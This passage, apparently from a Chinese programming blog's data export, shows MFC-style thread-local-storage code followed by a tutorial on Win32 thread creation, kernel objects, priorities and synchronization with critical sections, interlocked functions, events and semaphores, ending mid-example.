m_pSlotData[nSlot].dwFlags &amp;= ~SLOT_USED; ::LeaveCriticalSection(&amp;m_cs);&#125;inline void* CThreadSlotData::GetThreadValue(int nSlot)&#123; CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); if(pData == NULL || nSlot &gt;= pData-&gt;nCount) return NULL; return pData-&gt;pData[nSlot];&#125;void CThreadSlotData::SetValue(int nSlot, void* pValue)&#123; // 通过TLS索引得到我们为线程安排的私有存储空间 CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); // 为线程私有数据申请内存空间 if((pData == NULL || nSlot &gt;= pData-&gt;nCount) &amp;&amp; pValue != NULL) &#123; // pData的值为空，表示该线程第一次访问线程私有数据 if(pData == NULL) &#123; pData = new CThreadData; pData-&gt;nCount = 0; pData-&gt;pData = NULL; // 将新申请的内存的地址添加到全局列表中 ::EnterCriticalSection(&amp;m_cs); m_list.AddHead(pData); ::LeaveCriticalSection(&amp;m_cs); &#125; // pData-&gt;pData指向真正的线程私有数据，下面的代码将私有数据占用的空间增长到m_nMax指定的大小 if(pData-&gt;pData == NULL) pData-&gt;pData = (void**)::GlobalAlloc(LMEM_FIXED, m_nMax*sizeof(LPVOID)); else pData-&gt;pData = (void**)::GlobalReAlloc(pData-&gt;pData, m_nMax*sizeof(LPVOID), LMEM_MOVEABLE); // 将新申请的内存初始话为0 memset(pData-&gt;pData + pData-&gt;nCount, 0, (m_nMax - pData-&gt;nCount) * sizeof(LPVOID)); pData-&gt;nCount = m_nMax; ::TlsSetValue(m_tlsIndex, pData); &#125; // 设置线程私有数据的值 pData-&gt;pData[nSlot] = pValue;&#125;void CThreadSlotData::DeleteValues(HINSTANCE hInst, BOOL bAll)&#123; ::EnterCriticalSection(&amp;m_cs); if(!bAll) &#123; // 仅仅删除当前线程的线程局部存储占用的空间 CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); if(pData != NULL) DeleteValues(pData, hInst); &#125; else &#123; // 删除所有线程的线程局部存储占用的空间 CThreadData* pData = m_list.GetHead(); while(pData != NULL) &#123; CThreadData* pNextData = pData-&gt;pNext; DeleteValues(pData, hInst); pData = pNextData; &#125; &#125; ::LeaveCriticalSection(&amp;m_cs);&#125;void CThreadSlotData::DeleteValues(CThreadData* pData, HINSTANCE hInst)&#123; // 释放表中的每一个元素 BOOL bDelete = TRUE; for(int i=1; i&lt;pData-&gt;nCount; i++) &#123; if(hInst == NULL || m_pSlotData[i].hInst == hInst) &#123; // hInst匹配，删除数据 delete (CNoTrackObject*)pData-&gt;pData[i]; pData-&gt;pData[i] = NULL; &#125; else &#123; // 还有其它模块在使用，不要删除数据 if(pData-&gt;pData[i] != NULL) bDelete = FALSE; &#125; &#125; if(bDelete) &#123; // 从列表中移除 ::EnterCriticalSection(&amp;m_cs); m_list.Remove(pData); ::LeaveCriticalSection(&amp;m_cs); ::LocalFree(pData-&gt;pData); delete pData; // 清除TLS索引，防止重用 ::TlsSetValue(m_tlsIndex, NULL); &#125;&#125;CThreadSlotData::~CThreadSlotData()&#123; CThreadData *pData = m_list; while(pData != NULL) &#123; CThreadData* pDataNext = pData-&gt;pNext; DeleteValues(pData, NULL); pData = pData-&gt;pNext; &#125; if(m_tlsIndex != (DWORD)-1) ::TlsFree(m_tlsIndex); if(m_pSlotData != NULL) &#123; HGLOBAL hSlotData = ::GlobalHandle(m_pSlotData); ::GlobalUnlock(hSlotData); ::GlobalFree(m_pSlotData); &#125; ::DeleteCriticalSection(&amp;m_cs);&#125;//---------------------------------------CNoTrackObject类---------------------------void* CNoTrackObject::operator new(size_t nSize)&#123; // 申请一块带有GMEM_FIXED和GMEM_ZEROINIT标志的内存 void* p = ::GlobalAlloc(GPTR, nSize); return p;&#125;void CNoTrackObject::operator delete(void* p)&#123; if(p != NULL) ::GlobalFree(p);&#125;//----------------------------CThreadLocalObject 类--------------------------------//CNoTrackObject* CThreadLocalObject::GetData(CNoTrackObject* (*pfnCreateObject)())&#123; if(m_nSlot == 0) &#123; if(_afxThreadData == NULL) _afxThreadData = new(__afxThreadData) CThreadSlotData; m_nSlot = _afxThreadData-&gt;AllocSlot(); &#125; CNoTrackObject* pValue = (CNoTrackObject*)_afxThreadData-&gt;GetThreadValue(m_nSlot); if(pValue == NULL) &#123; // 创建一个数据项 pValue = (*pfnCreateObject)(); // 使用线程私有数据保存新创建的对象 _afxThreadData-&gt;SetValue(m_nSlot, pValue); &#125; return pValue;&#125;CNoTrackObject* CThreadLocalObject::GetDataNA()&#123; if(m_nSlot == 0 || _afxThreadData == 0) return NULL; return (CNoTrackObject*)_afxThreadData-&gt;GetThreadValue(m_nSlot);&#125;CThreadLocalObject::~CThreadLocalObject()&#123; if(m_nSlot != 0 &amp;&amp; _afxThreadData != NULL) _afxThreadData-&gt;FreeSlot(m_nSlot); m_nSlot = 0;&#125;//------------------------------------------","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"Win32程序的执行单元","slug":"win0003-Win32程序的执行单元","date":"2021-05-19T16:32:15.000Z","updated":"2021-06-24T23:50:19.284Z","comments":true,"path":"2021/05/20/win0003-Win32程序的执行单元/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/20/win0003-Win32程序的执行单元/","excerpt":"","text":"Win32程序的执行单元 线程的创建 线程函数的定义 1DWORD WINAPI ThreadProc(LPVOID lpParam) //线程函数名ThreadProc可以随意的 WINAPI 是一个宏名 1#define WINAPI __stdcall; __stdcall是新标准C/C++函数的调用方法 __stdcall采用自动清栈的方式 __cdecl采用的是手工清栈方式 ThreadProc是一个回调函数 如果没有显式说明的话，函数的调用方法是__cdecl lpParam参数由CreateTHread函数的第四个参数指定 创建新线程的函数是CreateThread 12345678HANDLE CreateThread（LPSECURITY_ATTRIBUTES lpThreadAttributes，//线程的安全属性DWORD dwStackSize， //指定线程堆栈的大小LPTHREAD_START_ROUTINE lpStartAddress，//线程函数的起始地址LPVOID IpParameter， //传递给线程函数的参数DWORD dwCreationFlags， //指定创线程建后是否立即启动DWORD* pThreadld //用于取得内核给新生成的线程分配的线程ID号); 成功：返回新建线程的句柄 IpThreadAttributes参数: 如果指定为NULL表示默认安全属性,且不可继承 如果希望此线程对象句柄可以被继承,则必须设定一个SECURITY_ATTRIBUTES结构,将它的bInheritHandle成员初始化为TRUE 1234567SECURITY ATTRIBUTES sasa.nLength =sizeof(sa)；sa.lpSecurityDescriptor = NULL;sa.binheritHandle=TRUE;//使CreateThread返回的句柄可以被继承//句柄h可以被子进程继承HANDLE h=：CreateThread(&amp;sa，....); dwCreationFlags—创建标志: 如果是0，表示线程被创建后立即开始运行；如果指定为CREATE_SUSPENDED标志，表示线程被创建以后处于挂起（暂停）状态，直到使用ResumeThread函数 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;// 线程函数DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; int i = 0; while(i &lt; 20) &#123; printf(\" I am from a thread, count = %d \\n\", i++); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; HANDLE hThread; DWORD dwThreadId; // 创建一个线程 hThread = ::CreateThread ( NULL, // 默认安全属性 NULL, // 默认堆栈大小 ThreadProc, // 线程入口地址（执行线程的函数） NULL, // 传给函数的参数 0, // 指定线程立即运行 &amp;dwThreadId); // 返回线程的ID号 printf(\" Now another thread has been created. ID = %d \\n\", dwThreadId); // 等待新线程运行结束 ::WaitForSingleObject (hThread, INFINITE); ::CloseHandle (hThread); return 0;&#125; INFINITE表示无限时间等待 WaitForSingleObject函数等待新线程运行结束 1234//等待新线程运行结束::WaitForSingleObject（ hThread， //hHandle 要等待的对象的句柄 INFINITE); //dwMilliseconds要等待的时间（以毫秒为单位） WaitForSingleObject函数用于等待指定的对象（hHandle）变成受信状态。参数dwMilliseconds给出了以毫秒为单位的要等待的时间，其值指定为INFINITE表示要等待无限长的时间。 当有下列一种情况发生时函数就会返回： （1）要等待的对象变成受信（signaled）状态。 （2）参数dwMilliseconds指定的时间已过去。 一个可执行对象有两种状态，未受信（nonsignaled）和受信（signaled）状态。 线程对象只有当线程运行结束时才达到受信状态，此时&quot;WaitForSingleObject（hThread，INFINITE）&quot;语句才会返回。 ### 内核句柄对象 线程内核对象就是一个包含了线程状态信息的数据结构。每一次对Create Thread函数的成 功调用，系统都会在内部为新的线程分配一个内核对象。系统提供的管理线程的函数其实就是 依靠访问线程内核对象来实现管理的。 线程内核对象（Thread Kernel Object） 1，线程上下文CONTEXT 每个线程都有它自己的一组CPU寄存器，称为线程的上下文。这组寄存器的值保存在一 个CONTEXT结构里，反映了该线程上次运行时CPU寄存器的状态。 2，使用计数Usage Count Usage Count成员记录了线程内核对象的使用计数，这个计数说明了此内核对象被打开的 次数。 当这个值是0的时候，系统就认为已经没有任何进程在引用此内核对象了，于是线程内核对象就要从内存中撤销。 只要线程没有结束运行， Usage Count的值就至少为1。 在创建一个新的线程时，CreateThread函数返回线程内核对象的句柄，相当于打开一次新创建的内核对象，这也会促使Usage Count的值加1，所以创建一个新的线程后，初始状态下Usage Count的值是2。之后，只要有进程打开此内核对象，就会使Usage Count的值加1。比如当有一个进程调用OpenThread 函数打开这个线程内核对象后， Usage Count的值会再次加1. 12345HANDLE OpenThread(DWORD dwDesiredAccess， //想要的访问权限，可以为THREAD ALL ACCESS等BOOL bInheritHandle， //指定此函数返回的句柄是否可以被子进程继承DWORD dwThreadld //目标线程ID号); //注意， OpenThread函数是Windows 2000及其以上产品的新特性， Windows 98并不支持它。 由于对这个函数的调用会使Usage Count的值加1，所以在使用完它们返回的句柄后一定要调用CloseHandle函数进行关闭。关闭内核对象句柄的操作就会使Usage Count的值减1. 还有一些函数仅仅返回内核对象的伪句柄，并不会创建新的句柄，当然也就不会影响Usage Count的值。如果对这些伪句柄调用CloseHandle函数，那么CloseHandle就会忽略对自己的调用并返回FALSE，对进程和线程来说，这些函数有： 12HANDLE GetCurrentProcess 0； //返回当前进程句柄HANDLE GetCurrentThread 0； //返回当前线程句柄 如果线程结束后Usage Count不为0,会造成内存泄露 当然，线程所在的进程结束后，该进程占用的所有资源都要释放 暂停次数Suspend Count 线程内核对象中的Suspend Count用于指明线程的暂停计数。 当调用CreateProcess （创建进程的主线程）或CreateThread函数时，线程的内核对象就被创建了，它暂停计数被初始化为1 （即处于暂停状态），这可以阻止新创建的线程被调度到CPU中。 因为线程的初始化需要时间，当线程完全初始化好了之后， CreateProcess或CreateThread检查是否传递了CREATE_SUSPENDED标志。如果传递了这个标志，那么这些函数就返回，同时新线程处于暂停状态。 如果尚未传递该标志，那么线程的暂停计数将被递减为0。当线程的暂停计数是0的时候，该线程就处于可调度状态。 暂停次数为1:暂停状态 暂停次数为0:可调度状态 ResuneThread唤醒一个线程 1DWORD ResuneThread (HANDLE hThread); //唤醒一个挂起的线程 该函数减少线程的暂停计数，当计数值减到0的时候，线程被恢复运行。如果调用成功ResumeThread函数返回线程的前一个暂停计数，否则返回OxFFFFFFFF （-1）。 单个线程可以被暂停若干次。如果一个线程被暂停了3次，它必须被唤醒3次才可以分配给一个CPU SuspendThread函数挂起一个线程。 123DWORD WINAPI SuspendThread( _In_HANDLE hThread ); 可调度的（没有处于暂停状态） 大约每经20ms， Windows查看一次当前存在的所有线程内核对象。在这些对象中，只有 一少部分是可调度的（没有处于暂停状态）， Windows选择其中的一个内核对象，将它的 CONTEXT （上下文）装入CPU的寄存器，这一过程称为上下文转换。 退出代码Exit Code 成员Exit Code指定了线程的退出代码，也可以说是线程函数的返回值。在线程运行期间，线程函数还没有返回， Exit Code的值是STILL_ACTIVE。线程运行结束后，系统自动将Exit Code设为线程函数的返回值。可以用GetExitCodeThread函数得到线程的退出代码。 12345678910DWORD dwExitCode；if(GetExitCodeThread(hThread， &amp;dwExitCode))&#123; if(dwExitCode == STILL ACTIVE) &#123; &#125; //目标线程还在运行 else &#123; &#125; //目标线程已经中止，退出代码为dwExitCode&#125;........ GetExitCodeThread得到线程的退出代码 1BOOL GetExitCodeThread( HANDLE hThread, LPDWORD lpExitCode); 是否受信Signaled 成员Signaled指示了线程对象是否为“受信”状态。 线程在运行期间， Signaled的值永远是FALSE，即“未受信”，只有当线程结束以后，系统才把Signaled的值置为TRUE，此时，针对此对象的等待函数就会返回，如上一小节中的WaitForSingleObject函数。 线程结束后,会变成受信状态 线程的终止 一当线程正常终止时，会发生下列事件： 在线程函数中创建的所有C++对象将通过它们各自的析构函数被正确地销毁。 该线程使用的堆栈将被释放。 系统将线程内核对象中Exit Code （退出代码）的值由STILL_ ACTIVE设置为线程函数的返回值。 系统将递减线程内核对象中Usage Code （使用计数）的值。 终止线程的执行有4种方法: （1）线程函数自然退出。当函数执行到return语句返回时， Windows将终止线程的执行。 建议使用这种方法终止线程的执行。 （2）使用ExitThread函数来终止线程，原型如下： 1void ExitThread（ DWORD dwExiCode ）//线程的退出代码 ExitThread函数会中止当前线程的运行，促使系统释放掉所有此线程使用的资源。但是， CCt资源却不能得到正确地清除。 （3）使用TerminateThread函数在一个线程中强制终止另一个线程的执行，原型如下： 1234BOOL TerminateThread(HANDLE hThread， //目标线程句柄DWORD dwExitCode //目标线程的退出代码); （4）使用ExitProcess函数结束进程，这时系统会自动结束进程中所有线程的运行。用这 种方法相当于对每个线程使用TerminateThread函数，所以也应当避免这种情况。 1DECLSPEC_NORETURN VOID ExitProcess(UINT uExitCode); //进程退出代码 线程的优先级 每个线程都要被赋予一个优先级号，取值为0（最低）到31 （最高）。 调用WaitForSingleObject函数就会导致主线程处于不可调度状态，还有在第4章要讨论的GetMessage函数，也会使线程暂停运行。 Windows支持6个优先级类： idle， below normal， normal， above normal，high和real-time. 线程刚被创建时，他的相对优先级总是被设置为normal，若要改变线程的优先级，必须 使用下面这个函数： 1BOOL SetThreadPriority(HANDLE hThread,int nPriority ); hThread参数是目标线程的句柄, nPriority参数定义了线程的优先级,取值如下所示: THREAD_PRIORITY_TIME_CRITICAL Time-critical (实时) THREAD_PRIORITY_HIGHEST_Highest (最高) THREAD_PRIORITY_ABOVE_NORMAL Above normal (高于正常, Windows 98不支持) THREAD_PRIORITY_NORMAL Nornal (正常) THREAD_PRIORITY_BELOW_NORMAL Below normal （低于正常， Windows 98不支持） THREAD_PRIORITY_LOWEST Lowest （最低） THREAD_PRIORITY_IDLE Idle （空闲） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD WINAPI ThreadIdle(LPVOID lpParam)&#123; int i = 0; while(i++&lt;10) printf(\"Idle Thread is running \\n\"); return 0;&#125;DWORD WINAPI ThreadNormal(LPVOID lpParam)&#123; int i = 0; while(i++&lt;10) printf(\" Normal Thread is running \\n\"); return 0;&#125;int main(int argc, char* argv[])&#123; DWORD dwThreadID; HANDLE h[2]; // 创建一个优先级为Idle的线程 h[0] = ::CreateThread(NULL, 0, ThreadIdle, NULL, CREATE_SUSPENDED, &amp;dwThreadID); ::SetThreadPriority(h[0], THREAD_PRIORITY_IDLE); ::ResumeThread(h[0]); // 创建一个优先级为Normal的线程 h[1] = ::CreateThread(NULL, 0, ThreadNormal, NULL, 0, &amp;dwThreadID); // 等待两个线程内核对象都变成受信状态 ::WaitForMultipleObjects( 2, // DWORD nCount 要等待的内核对象的数量 h, // CONST HANDLE *lpHandles 句柄数组 TRUE, // BOOL bWaitAll 指定是否等待所有内核对象变成受信状态 INFINITE); // DWORD dwMilliseconds 要等待的时间 ::CloseHandle(h[0]); ::CloseHandle(h[1]); return 0;&#125;/**/ 创建线程时可以给参数指定CREATE_SUSPENDED，让线程挂起 ResumeThread函数恢复线程运行。 WaitForMultipleObjects函数 123456DWORD WaitForMultipleObjects(DWORD nCount, //数组个数const HANDLE* lpHandles, //句柄数组BOOL bWaitAll, //指定是否等待所有内核对象变成受信状态DWORD dwMilliseconds //要等待的时间); 用于等待多个内核对象，前两个参数分别为要等待的内核对象的个数和句柄数组指针。 如果将第三个参数bWaitAll的值设为TRUE，等待的内核对象全部变成受信状态以后此函数才返回。否则， bWaitAll为0的话，只要等待的内核对象中有一个变成了受信状态， WaitForMultipleObjects就返回，返回值指明了是哪一个内核对象变成了受信状态。 参数bWaitAll为FALSE的时候， WaitForMultpleObjects函数从索引0开始扫描整个句柄 数组，第一个受信的内核对象将终止函数的等待，使函数返回。 下面的代码说明了函数返回值的作用： 12345678910111213141516171819HANDLE h[2];h[0] = hThread1;h[1] = hThread2;DWORD dw = ::WaitForMultipleObjects(2, h, FALSE, 5000);switch(dw)&#123;case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) break;case WAIT_TIMEOUT: // 在5秒内没有一个内核对象受信 break;case WAIT_OBJECT_0 + 0: // 句柄h[0]对应的内核对象受信 break;case WAIT_OBJECT_0 + 1: // 句柄h[1]对应的内核对象受信 break;&#125; C/C++运行期库 #include &lt;process.h&gt; 在实际的开发过程中，一般不直接使用windows系统提供的CreateThread函数创建线程， 而是使用C/C++运行期函数_beginthreadex。 _beginthreadex的参数与CreateThread函数是对应的，只是参数名和类型不完全相同，使用的 时候需要强制转化。 12345678unsigned long _beginthreadex(void *security,unsigned stack_size,unsigned (__stdcall *start_address) ( void *),void *arglist,unsigned initflag,unsigned *thrdaddr); 相应地， C/C++运行期库也提供了另一个版本的结束当前线程运行的函数，用于取代 ExitThread函数。 1void _endthreadex（unsigned retval ）； //指定退出代码 这个函数会释放_beginthreadex为保持线程同步而申请的内存空间，然后再调用ExitThread 函数来终止线程。 使用_beginthreadex来创建一个线程 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;windows.h&gt;#include &lt;process.h&gt;using namespace std;DWORD WINAPI my(LPVOID lpParam)&#123; cout &lt;&lt; 132 &lt;&lt; endl; cout &lt;&lt; 132 &lt;&lt; endl; cout &lt;&lt; 132 &lt;&lt; endl; return 0;&#125;int main(char *argv[], int argc)&#123; DWORD threadId; HANDLE h = (HANDLE) _beginthreadex(NULL,NULL,(_beginthreadex_proc_type)my,NULL,0, (unsigned*)&amp;threadId); WaitForSingleObject(h, INFINITE); CloseHandle(h); return 0;&#125; 线程同步 临界区对象 当多个线程在同一个进程中执行时，可能有不止一个线程同时执行同一段代码，访问同一段内存中的数据。多个线程同时读共享数据没有问题，但如果同时读和写，情况就不同了。 使用临界区对象 临界区对象是定义在数据段中的一个CRITICAL_SECTION结构， Windows内部使用这个结构记录一些信息，确保在同一时间只有一个线程访问该数据段中的数据。 编程的时候，要把临界区对象定义在想保护的数据段中，然后在任何线程使用此临界区对象之前对它进行初始化。 12void InitializeCriticalSection（LPCRITICAL_SECTION IpCriticalSection）；//指向数据段中定义的CRITICAL_SECTION结构 线程访问临界区中数据的时候，必须首先调用EnterCriticalSection函数，申请进入临界区（文叫关键代码段），在同一时间内， Windows只允许一个线程进入临界区。 所以在申请的时候，如果有另一个线程在临界区的话， EnterCriticalSection函数会一直等待下去，直到其他线程离开临界区才返回。EnterCriticalSection函数用法如下： 1void EnterCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）； 当操作完成的时候，还要将临界区交还给Windows，以便其他线程可以申请使用。这个工作由LeaveCriticalSection函数来完成。 1void LeaveCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）; 当程序不再使用临界区对象的时候，必须使用DeleteCriticalSection函数将它删除。 1void DeleteCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）; 现在使用临界区对象来改写上面有同步问题的计数程序。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;BOOL g_bContinue = TRUE;int g_nCount1 = 0;int g_nCount2 = 0;CRITICAL_SECTION g_cs; // 对存在同步问题的代码段使用临界区对象UINT __stdcall ThreadFunc(LPVOID);int main(int argc, char* argv[])&#123; UINT uId; HANDLE h[2]; // 初始化临界区对象 ::InitializeCriticalSection(&amp;g_cs); h[0] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); h[1] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); // 等待1秒后通知两个计数线程结束，关闭句柄 Sleep(1000); g_bContinue = FALSE; ::WaitForMultipleObjects(2, h, TRUE, INFINITE); ::CloseHandle(h[0]); ::CloseHandle(h[1]); // 删除临界区对象 ::DeleteCriticalSection(&amp;g_cs); printf(&quot;g_nCount1 = %d \\n&quot;, g_nCount1); printf(&quot;g_nCount2 = %d \\n&quot;, g_nCount2); return 0;&#125;UINT __stdcall ThreadFunc(LPVOID)&#123; while(g_bContinue) &#123; ::EnterCriticalSection(&amp;g_cs); g_nCount1++; g_nCount2++; ::LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125; 互锁函数 互锁函数为同步访问多线程共享变量提供了一个简单的机制。如果变量在共享内存，不同 进程的线程也可以使用此机制。 用于互锁的函数有InterlockedIncrement. InterlockedDecrement. InterlockedExchangeAdd， InterlockedExchangePointer等. InterlockedIncrement函数递增（加1）指定的32位变量。这个函数可以阻止其他线程同 时使用此变量，函数原型如下： 12LONG InterlockedIncrement（ LONG volatile* Addend）;//指向要递增的变量 InterlockedDecrement函数同步递减（减1）指定的32位变量，原型如下： 12LONG InterlockedDecrement( LONG volatile* Addend);//指向要递减的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445///////////////////////////////////////////////////////////////// InterlockDemo.cpp文件#include &lt;stdio.h&gt;#include &lt;windows.h&gt; #include &lt;process.h&gt;int g_nCount1 = 0;int g_nCount2 = 0;BOOL g_bContinue = TRUE;UINT __stdcall ThreadFunc(LPVOID);int main(int argc, char* argv[])&#123; UINT uId; HANDLE h[2]; h[0] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); h[1] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); // 等待1秒后通知两个计数线程结束，关闭句柄 Sleep(1000); g_bContinue = FALSE; ::WaitForMultipleObjects(2, h, TRUE, INFINITE); ::CloseHandle(h[0]); ::CloseHandle(h[1]); printf(\"g_nCount1 = %d \\n\", g_nCount1); printf(\"g_nCount2 = %d \\n\", g_nCount2); return 0;&#125;UINT __stdcall ThreadFunc(LPVOID)&#123; while(g_bContinue) &#123; ::InterlockedIncrement((long*)&amp;g_nCount1); ::InterlockedIncrement((long*)&amp;g_nCount2); &#125; return 0;&#125; 事件内核对象 多线程程序设计大多会涉及线程间相互通信。 事件对象（event）是一种抽象的对象，它也有未受信（nonsignaled）和受信（signaled）两种状态，编程人员也可以使用WaitForSingleObject函数等待其变成受信状态。 事件对象包含3个成员： nUsageCount （使用计数）、bManualReset （是否人工重置）和 bSignaled （是否受信）。 成员nUsagecount记录当前的使用计数，当使用计数为0的时候，Windows就会销毁此内核对象占用的资源； 成员bManualReset指定在一个事件内核对象上等待的函数返回之后， Windows是否重置这个对象为未受信状态； 成员bsignaled指定当前事件内核对象是否受信。 如果想使用事件对象，需要首先用CreateEvent函数去创建它，初始状态下， nUsageCount 的值为1. 12345HANDLE CreateEvent（LPSECURITY_ATTRIBUTES IpEventAttributes， //用来定义事件对象的安全属性BOOL bManualReset, //指定是否需要手动重置事件对象为未受信状态。BOOL bInitialState，//指定事件对象创建时的初始状态LPCWSTR IpName）;//事件对象的名称 参数bManualReset对应着内核对象中的bManualReset成员。 自动重置（auto-reset）和人工重置（manual-reset）是事件内核对象两种不同的类型。 当一个人工重置的事件对象受信以后，所有等待在这个事件上的线程都会变为可调度状态(暂停次数为0)； 可是当一个自动重置的事件对象受信以后， Windows仅允许一个等待在该事件上的线程变成可调度状态，然后就自动重置此事件对象为未受信状态。 blnitialState参数对应着bSignaled成员。 将它设为TRUE，则表示事件对象创建时的初始化状态为受信(结束)（bSignaled =TRUE）；设为FALSE时，状态为未受信(未结束)（bSignaled =FALSE）。 IpName参数用来指定事件对象的名称。为事件对象命名是为了在其他地方（比如，其他 进程的线程中）使用OpenEvent或CreateEvent函数获取此内核对象的句柄。 1234HANDLE OpenEvent (DWORD dwDesiredAccess, //指定想要的访问权限BOOL blnheritHandle, //指定返回句柄是否可被继承LPCWSTR IpName); //要打开的事件对象的名称 系统创建或打开一个事件内核对象后，会返回事件的句柄。当编程人员不使用此内核对象的时候，应该调用CloseHandle函数释放它占用的资源。 事件对象被建立后，程序可以通过SetEvent和ResetEvent函数来设置它的状态。 12BOOL SetEvent(HANDLE hEvent ); //将事件状态设为&quot;受信(sigaled) &quot;;BOOL ResetEvent(HANDLE hEvent); //将事件状态设为&quot;未受信(nonsigaled) &quot;; 通常情况下，为一个自动重置类型的事件对象调用ResetEvent函数是不必要的，因为Windows会自动重置此事件对象。 下面例子中，主线程通过将事件状态设为“受信”来通知子线程开始工作。这是事件内核对 象一个很重要的用途，示例代码如下： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;HANDLE g_hEvent;UINT __stdcall ChildFunc(LPVOID);int main(int argc, char* argv[])&#123; HANDLE hChildThread; UINT uId; // 创建一个自动重置的（auto-reset events），未受信的（nonsignaled）事件内核对象 g_hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL); hChildThread = (HANDLE)::_beginthreadex(NULL, 0, ChildFunc, NULL, 0, &amp;uId); // 通知子线程开始工作 printf(\"Please input a char to tell the Child Thread to work: \\n\"); getchar(); ::SetEvent(g_hEvent); // 等待子线程完成工作，释放资源 ::WaitForSingleObject(hChildThread, INFINITE); printf(\"All the work has been finished. \\n\"); ::CloseHandle(hChildThread); ::CloseHandle(g_hEvent); return 0;&#125;UINT __stdcall ChildFunc(LPVOID)&#123; ::WaitForSingleObject(g_hEvent, INFINITE); printf(\" Child thread is working...... \\n\"); ::Sleep(5*1000); // 暂停5秒，模拟真正的工作 return 0;&#125; 信号量内核对象 信号量（Semaphore）内核对象对线程的同步方式与前面几种方法不同，它允许多个线程 在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。 在用CreateSemaphore函数创建信号量时，即要同时指出允许的最大资源计数和当前可用资源计数。 一般是将当前可用资源计数设置为最大资源计数，每增加一个线程对共享资源的访问，当前可 用资源计数就会减1，只要当前可用资源计数是大于0的，就可以发出信号量信号。 但是当前可用计数减小到0时则说明当前占用资源的线程数已经达到了所允许的最大数目，不能再允许 其他线程的进入，此时的信号量信号将无法发出。 线程在处理完共享资源后，应在离开的同时通过ReleaseSemaphore函数将当前可用资源计数加1，在任何时候当前可用资源计数决不可能大于最大资源计数。 以箭头和白色箭头表示共享资源所允许的最大资源计数和当前可用资源计数。 黑色箭头表示已经访问的资源个数。当可用资源为0时，其他线程不能进入，直到可用资源大于0时，其他线程才可访问 信号量也被称作Dikstrait数器。 使用信号量内核对象进行线程同步主要会用到CreateSemaphore，OpenSemaphore、ReleaseSemaphore、 WaitForSingleObject和WaitForMultipleObjects等函数。 其中CreateSemaphore用来创建一个信号量内核对象，其函数原型为： 123456HANDLE CreateSemaphore(LPSECURITY_ATTRIBUTES IpSemaphoreAttributes,//安全属性指针LONG IInitialCount,//初始计数LONG IMaximumCount,//最大计数LPCTSTR IpName//对象名指针); 参数IMaximumCount是一个有符号32位值，定义了允许的最大资源计数，最大取值不能 超过4294967295， IpName参数可以为创建的信号量定义一个名字，由于其创建的是一个内核 对象，因此在其他进程中可以通过该名字而得到此信号量。 OpenSemaphore （）函数即可用来根据信号量名打开在其他进程中创建的信号量，函数原型如下： 12345HANDLE OpenSemaphore(DWORD dwDesiredAccess, //访问标志BOOL bInheritHandle, //继承标志LPCTSTR IpName //信号量名); 在线程离开对共享资源的处理时，必须通过ReleaseSemaphore来增加当前可用资源计数。否则，将会出现当前正在处理共享资源的实际线程数并没有达到要限制的数值，而其他线程却因为当前可用资源计数为0而仍无法进入的情况。 ReleaseSemaphore的函数原型为： 12345BOOL ReleaseSemaphore(HANDLE hSemaphore, //信号量句柄LONG IReleaseCount, //计数递增数量LPLONG IpPreviousCount //先前计数); 该函数将IReleaseCount中的值添加给信号量的当前资源计数，一般将IReleaseCount设置 为1，如果需要也可以设置其他的值。 WaitForSingleObject和WaitForMultipleObjects主要用在试图进入共享资源的线程函数入口处，主要用来判断信号量的当前可用资源计数是否允许本线程的进入。 只有在当前可用资源计数值大于0时，被监视的信号量内核对象才会得到通知。 信号量的使用特点使甚更适用于对Socket （套接字）程序中线程的同步。 例如，网络上的HTTP服务器要对同一时间内访问同一页面的用户数加以限制，这时可以为没一个用户对服务 器的页面请求设置一个线程，而页面则是待保护的共享资源，通过使用信号量对线程的同步作用可以确保在任一时刻无论有多少用户对某一页面进行访问，只有不大于设定的最大用户数目的线程能够进行访问，而其他的访问企图则被挂起，只有在有用户退出对此页面的访问后才有可能进入。 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt; //使用_beginthreadex创建线程需要包含此文件using namespace std;//信号量对象句柄HANDLE hSemaphore;UINT WINAPI myThread(LPVOID pParam) &#123; //试图进入信号量关口 WaitForSingleObject(hSemaphore, INFINITE); for (int i = 0; i &lt; 5; i++) &#123; cout &lt;&lt; i &lt;&lt; endl; &#125; //释放信号量计数 ReleaseSemaphore(hSemaphore,1,NULL); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hSemaphore = CreateSemaphore(NULL, 1, 1, NULL); HANDLE h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); HANDLE h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); HANDLE h3 = (HANDLE)_beginthreadex(NULL, NULL, 